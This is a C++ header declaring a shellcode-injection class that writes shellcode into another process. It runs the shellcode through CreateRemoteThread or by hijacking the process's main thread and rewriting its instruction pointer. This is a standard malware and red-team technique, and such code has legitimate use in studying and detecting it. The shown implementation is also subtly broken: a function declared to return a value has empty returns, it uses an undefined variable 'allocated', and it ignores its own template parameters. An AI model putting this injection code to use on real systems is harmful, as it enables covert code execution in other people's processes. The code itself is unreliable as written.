#pragma once

#include "util.h"
#include "pe.h"

// Base class for all of the injection classes
class injector_t
{
public:
    // inject shellcode into a process described with PROCESS_INFO and execute it via CreateRemoteThread API
    void inject_shellcode_crt(const PROCESS_INFO& process_info, const std::vector<BYTE>& shellcode);
    // inject shellcode into a process described with PROCESS_INFO and execute it via Main Thread Hijacking method (x64)
    void inject_shellcode_mth_x64(const PROCESS_INFO& process_info, std::vector<BYTE> shellcode);
    // inject shellcode into a process described with PROCESS_INFO and execute it via Main Thread Hijacking method (x86)
    void inject_shellcode_mth_x86(const PROCESS_INFO& process_info, std::vector<BYTE> shellcode);
    // inject shellcode into a process described with PROCESS_INFO and execute it via Main Thread Hijacking method
    void inject_shellcode_mth(const PROCESS_INFO& process_info, std::vector<BYTE> shellcode);

private:
    template <typename CONTEXT, typename CONTEXT_FLAGS, typename get_thread_context, typename addr_type, typename set_thread_context>
    boolean adjust_thread_context(const HANDLE& main_thread, std::vector<BYTE>& shellcode, addr_type address, get_thread_context gtc, set_thread_context stc)
    {
        // obtain the context of main thread
        CONTEXT context;
        context.ContextFlags = CONTEXT_FLAGS;
        if (gtc(main_thread, &context))
        {
            // restore the previous entry point
            shellcode[shellcode.size() - 1 - 4] = (BYTE)context.Eip;
            shellcode[shellcode.size() - 1 - 3] = (BYTE)(context.Eip >> 8);
            shellcode[shellcode.size() - 1 - 2] = (BYTE)(context.Eip >> 16);
            shellcode[shellcode.size() - 1 - 1] = (BYTE)(context.Eip >> 24);
        }
        else
        {
            print_error(GetLastError());
            return;
        }

        // modify thread context to execute the shellcode
        context.Eip = (DWORD)allocated;
        context.ContextFlags = WOW64_CONTEXT_CONTROL;
        if (!Wow64SetThreadContext(main_thread, &context))
        {
            print_error(GetLastError());
            return;
        }
    }
};